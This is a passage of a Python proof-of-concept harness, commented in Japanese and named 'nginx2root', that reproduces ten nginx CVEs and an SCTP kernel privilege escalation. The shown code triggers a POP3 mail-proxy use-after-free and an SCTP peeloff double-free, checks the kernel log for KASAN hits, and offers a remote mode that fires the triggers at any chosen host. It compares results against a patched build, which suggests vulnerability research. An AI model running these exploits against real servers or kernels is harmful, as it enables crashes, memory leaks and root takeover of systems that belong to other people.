    """mail proxy auth_http の UAF: 送信詰まり + LOGIN + RST。"""
    p = env.PORTS
    host = "127.0.0.1"
    tries = 40
    for _ in range(tries):
        try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)
            s.settimeout(3)
            s.connect((host, p["pop3"]))
            s.recv(128)
            # 応答を読まずに大量の NOOP → ngx_mail_send が EAGAIN で write イベント登録
            s.sendall(b"NOOP\r\n" * 2000)
            s.sendall(b"USER u\r\nPASS p\r\n")
            time.sleep(0.01)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            s.close()
            time.sleep(0.03)
        except OSError:
            try:
                s.close()
            except OSError:
                pass
    time.sleep(0.6)
    crash = env.crashed()
    if crash:
        return Result("CVE-2026-113425", True, True, "CRASH", crash[-1])
    return Result("CVE-2026-113425", True, True, "TRIGGERED",
                  "%d 回の POP3 ログイン + RST（auth 接続が解放済みセッションを参照）" % tries)


# ---------------------------------------------------------------------------
# kernel: SCTP association transfer の double free / UAF
# ---------------------------------------------------------------------------

def kernel_sctp(args):
    """SCTP: send 待ち中に association を peeloff で移動 → double free/UAF。

    記事では「send 操作が待機中に association が別 socket へ移され、待機中の
    操作が移動後の association を解放する」経路が示されている。ここでは
    SCTP_STATUS で assoc id を取得し、SCTP_SOCKOPT_PEELOFF で別 fd へ移す。
    """
    N = 200
    res = Result("SCTP LPE", True, False, "SKIP", "")
    try:
        fam = socket.AF_INET
        srv = socket.socket(fam, socket.SOCK_STREAM, 132)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        port = srv.getsockname()[1]
    except OSError as e:
        return Result("SCTP LPE", False, False, "SKIP",
                      "SCTP ソケット作成不可（sctp モジュール未ロード）: %s" % e)

    dmesg_before = _dmesg_tail()
    done = 0
    try:
        for _ in range(N):
            cli = socket.socket(fam, socket.SOCK_STREAM, 132)
            try:
                cli.connect(("127.0.0.1", port))
                conn, _ = srv.accept()
            except OSError:
                cli.close()
                continue
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096)
            cli.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)

            stop = threading.Event()

            def sender(sock=conn, ev=stop):
                try:
                    while not ev.is_set():
                        sock.send(b"A" * 65536)
                except OSError:
                    pass

            th = threading.Thread(target=sender, daemon=True)
            th.start()
            time.sleep(0.002)

            # assoc id を取得（struct sctp_status の先頭 4 バイト）
            try:
                st = conn.getsockopt(132, 14, 64)
                assoc = struct.unpack_from("=I", st, 0)[0]
                # peeloff: 戻り値は (associd, newfd)
                arg = conn.getsockopt(132, 102, 8)
                _, newfd = struct.unpack("=II", arg)
                if newfd > 0:
                    os.close(newfd)
                done += 1
            except OSError:
                pass

            stop.set()
            time.sleep(0.002)
            try:
                conn.close()
            except OSError:
                pass
            try:
                cli.close()
            except OSError:
                pass
    finally:
        try:
            srv.close()
        except OSError:
            pass

    time.sleep(0.5)
    dmesg = _dmesg_tail()
    new = dmesg[len(dmesg_before):] if len(dmesg) > len(dmesg_before) else dmesg
    hit = [l for l in new.splitlines()
           if re.search(r"(double[- ]free|use[- ]after[- ]free|KASAN|sctp)", l, re.I)]
    if hit:
        return Result("SCTP LPE", True, True, "KERNEL-UAF",
                      "%d 回 peeloff。dmesg: %s" % (done, hit[-1][:160]))
    if done == 0:
        return Result("SCTP LPE", False, False, "SKIP", "peeloff に失敗")
    return Result("SCTP LPE", True, True, "TRIGGERED",
                  "%d 回の send 待ち + association 移動（dmesg に KASAN 出力なし）" % done)


def _kill_by_cmdline(needle):
    for d in os.listdir("/proc"):
        if not d.isdigit():
            continue
        try:
            with open("/proc/%s/cmdline" % d, "rb") as f:
                cmd = f.read().replace(b"\x00", b" ").decode(errors="ignore")
        except OSError:
            continue
        if needle in cmd:
            try:
                os.kill(int(d), signal.SIGKILL)
            except OSError:
                pass


def _dmesg_tail(n=200):
    try:
        with open("/dev/kmsg", "r", errors="ignore") as f:
            lines = f.readlines()[-n:]
        return "".join(lines)
    except OSError:
        pass
    try:
        return subprocess.run(["dmesg", "--ctime"], capture_output=True,
                              text=True, timeout=5).stdout[-8192:]
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# リモートモード
# ---------------------------------------------------------------------------

class RemoteEnv:
    def __init__(self, host, tls_port, h1_port, quic_port, mail_port):
        self.PORTS = dict(h2=tls_port, h2proxy=tls_port, h1=h1_port,
                          quic=quic_port, pop3=mail_port, imap=mail_port, smtp=mail_port)
        self.host = host
        self.features = dict(v3=True, v2=True, mail=True, version="remote")
        self.prefix = ROOT / "poc-run-remote"

    def crashed(self):
        return []


# ---------------------------------------------------------------------------
# メイン
# ---------------------------------------------------------------------------

# このファイル内にインライン実装を持つ 5 件 + modules 専用エントリ 5 件。
# 後者（None）は modules/<cve>.py の run() 経由でのみ実行され、
# --no-modules 時は SKIP と表示されます。
MODULES = {
    "123007": cve_123007,
    "123634": cve_123634,
    "123633": cve_123633,
    "121810": cve_121810,
    "113425": cve_113425,
    "125283": None,
    "123640": None,
    "120967": None,
    "120993": None,
    "118899": None,
}


def pick_local_bins(args):
    if args.local_bin:
        return [("vuln", Path(args.local_bin), Path(args.local_bin).parent.parent)]
    vuln = BUILD / "inst-vuln" / "sbin" / "nginx"
    fixed = BUILD / "inst-fixed" / "sbin" / "nginx"
    if args.compare:
        if not vuln.exists() or not fixed.exists():
            log("build/inst-vuln と build/inst-fixed が必要です", C_RED)
            sys.exit(1)
        return [("vuln", vuln, BUILD / "inst-vuln"),
                ("fixed", fixed, BUILD / "inst-fixed")]
    if vuln.exists():
        return [("vuln", vuln, BUILD / "inst-vuln")]
    w = shutil.which("nginx")
    if w:
        return [("system", Path(w), Path(w).parent.parent)]
    log("nginx バイナリが見つかりません（--local-bin を指定）", C_RED)
    sys.exit(1)


def run_local(env, args, servers):
    log("\n=== %s (%s) ===" % (env.tag, env.features.get("version")), C_BLD)
    env.setup()
    env.start()
    results = []
    try:
        for key in args.only:
            fn = MODULES[key]
            if fn is None:
                results.append(Result("CVE-2026-" + key, True, False, "SKIP",
                                       "modules 専用エントリ（--no-modules 時は SKIP）"))
                log("  " + results[-1].line())
                continue
            try:
                r = fn(env, args)
            except Exception as e:
                r = Result("CVE-2026-" + key, True, False, "ERROR", repr(e))
            results.append(r)
            log("  " + r.line())
    finally:
        env.stop()
        if env.crashed():
            log("  異常終了: " + " / ".join(env.crashed()[-2:]), C_RED)
    return results


def _load_module(key):
    """modules/<key>.py を読み込む（サブタスク成果物の自己完結モジュール）。"""
    path = ROOT / "modules" / (key + ".py")
    if not path.exists():
        return None
    import importlib.util
    spec = importlib.util.spec_from_file_location("nx2r_mod_" + key, str(path))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def modules_available(keys):
    return all((ROOT / "modules" / (k + ".py")).exists() for k in keys)


def run_modules(binary, tag, args):
    """各 CVE を modules/<cve>.py の run() で実行する（nginx の起動・停止も各モジュール内）。"""
    log("\n=== %s (%s, modules) ===" % (tag, Path(binary).as_posix()), C_BLD)
    results = []
    for key in args.only:
        mod = _load_module(key)
        if mod is None or not hasattr(mod, "run"):
            results.append(Result("CVE-2026-" + key, True, False, "SKIP", "modules/%s.py なし" % key))
            continue
        workdir = ROOT / ("poc-run-" + key)
        workdir.mkdir(parents=True, exist_ok=True)
        kwargs = {}
        if key == "123007":
            kwargs = {"quick": args.quick, "wu_budget_gb": args.wu_budget_gb}
        try:
            r = mod.run(str(binary), str(workdir), args.host, **kwargs)
            res = Result(r.get("cve", "CVE-2026-" + key),
                         bool(r.get("configured", True)),
                         bool(r.get("trigger", False)),
                         r.get("effect", "ERROR"),
                         r.get("detail", ""))
        except Exception as e:
            res = Result("CVE-2026-" + key, True, False, "ERROR", repr(e))
        results.append(res)
        log("  " + res.line())
    return results


def run_kernel_module():
    mod = _load_module("sctp_lpe")
    if mod is None or not hasattr(mod, "run"):
        return kernel_sctp(argparse.Namespace())
    workdir = ROOT / "poc-run-E"
    workdir.mkdir(parents=True, exist_ok=True)
    try:
        r = mod.run(str(workdir))
        return Result(r.get("cve", "SCTP-LPE"), bool(r.get("configured", True)),
                      bool(r.get("trigger", False)), r.get("effect", "ERROR"),
                      r.get("detail", ""))
    except Exception as e:
        return Result("SCTP-LPE", True, False, "ERROR", repr(e))


def run_remote(env, args):
    log("\n=== remote %s ===" % args.host, C_BLD)
    results = []
    for key in args.only:
        fn = MODULES[key]
        if fn is None:
            results.append(Result("CVE-2026-" + key, True, False, "SKIP",
                                  "modules 専用エントリ（--no-modules 時は SKIP）"))
            log("  " + results[-1].line())
            continue
        try:
            r = fn(env, args)
        except Exception as e:
            r = Result("CVE-2026-" + key, True, False, "ERROR", repr(e))
        results.append(r)
        log("  " + r.line())
    return results


def main():
    ap = argparse.ArgumentParser(
        description="nginx2root（nginx 10 件 + SCTP LPE）フル再現 PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__)
    ap.add_argument("--mode", choices=["local", "remote"], default="local")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--tls-port", type=int, default=443)
    ap.add_argument("--h1-port", type=int, default=80)
    ap.add_argument("--quic-port", type=int, default=443)
    ap.add_argument("--mail-port", type=int, default=143)
    ap.add_argument("--local-bin", default=None,
                    help="ローカル nginx バイナリ（省略時は build/inst-vuln を自動検出）")
    ap.add_argument("--compare", action="store_true",
                    help="1.31.8 と 1.31.9 を順に実行して差分を表示")
    ap.add_argument("--only",
                    default="123007,123634,123633,121810,113425,125283,123640,120967,120993,118899",
                    help="実行する CVE（カンマ区切り、既定は全 10 件）")
    ap.add_argument("--pings", type=int, default=100,
                    help="123007 で送る PING 数（d = 17p + 9s - 55 の調整）")
    ap.add_argument("--wu-budget-gb", type=float, default=112.0,
                    help="123007 の WINDOW_UPDATE 総量（完全ラップは約 111 GB）")
    ap.add_argument("--leak-back", type=int, default=65536,
                    help="123007 の巨大コピーで戻る距離 D（既定 64KB; 16KB フレーム 1 枚分の余裕込み）")
    ap.add_argument("--quick", action="store_true",
                    help="123007 を小予算で回し、修正版との差分だけを見る")
    ap.add_argument("--no-modules", action="store_true",
                    help="modules/*.py を使わず、このファイル内蔵の実装で実行する")
    ap.add_argument("--kernel", action="store_true", help="SCTP カーネル LPE も実行")
    ap.add_argument("--servers", action="store_true", default=True,
                    help=argparse.SUPPRESS)
    args = ap.parse_args()
    args.only = [x.strip() for x in args.only.split(",") if x.strip() in MODULES]
    if not args.only:
        log("実行対象の CVE がありません", C_RED)
        return 1

    use_modules = (args.mode == "local" and not args.no_modules
                   and modules_available(args.only))
    servers = None if use_modules else Servers().start()
    all_results = []
    try:
        if args.mode == "remote":
            env = RemoteEnv(args.host, args.tls_port, args.h1_port,
                            args.quic_port, args.mail_port)
            all_results.append(("remote", run_remote(env, args)))
        elif use_modules:
            for tag, binary, bdir in pick_local_bins(args):
                all_results.append((tag, run_modules(binary, tag, args)))
        else:
            for tag, binary, bdir in pick_local_bins(args):
                env = NginxEnv(binary, tag, bdir)
                env.detect()
                all_results.append((tag, run_local(env, args, servers)))
        if args.kernel:
            r = run_kernel_module() if _load_module("sctp_lpe") else kernel_sctp(args)
            all_results.append(("kernel", [r]))
            log("  " + r.line())
    finally:
        if servers is not None:
            servers.stop()

    # サマリ
    log("\n" + "=" * 78, C_BLD)
    log("結果サマリ", C_BLD)
    log("=" * 78, C_BLD)
    for tag, results in all_results:
        for r in results:
            mark = {"RCE": C_GRN, "LEAK": C_GRN, "CRASH": C_YEL, "UAF": C_GRN,
                    "KERNEL-UAF": C_GRN, "ACCEPT": C_YEL, "FLOWCTRL": C_GRN,
                    "TRIGGERED": C_CYA, "CLOSED": C_YEL, "SKIP": C_YEL,
                    "ERROR": C_RED, "NONE": C_YEL}.get(r.effect, C_RESET)
            log("[%-6s] %s" % (tag, r.line()), mark)
    log("\n凡例: effect=RCE/LEAK/CRASH/UAF/KERNEL-UAF が確認できた効果、"
        "TRIGGERED はトリガ送信済み（効果は環境依存）、"
        "FLOWCTRL/CLOSED は修正版で観測される拒否。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
